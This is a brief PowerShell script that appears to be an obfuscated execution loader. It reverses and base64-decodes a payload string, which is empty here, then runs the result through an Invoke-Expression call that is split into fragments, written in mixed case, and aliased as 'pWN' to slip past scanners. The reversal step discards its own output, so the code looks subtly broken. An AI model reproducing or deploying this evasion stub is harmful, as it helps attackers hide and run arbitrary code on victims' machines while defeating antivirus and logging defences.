$best64code = "" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LOaDcodE = [system.tEXT.ENcodinG]::UTF8.GEtstrinG([sYsTeM.cOnVeRT]::FrOMbAsE64STrING("$base64")) ;
$pWN = "INV"+"oKe"+"-EX"+"pRE"+"ssI"+"ON" ; New-AlIaS -NAME pWN -ValUE $pWN -fORcE ; Pwn $LoAdcode ;
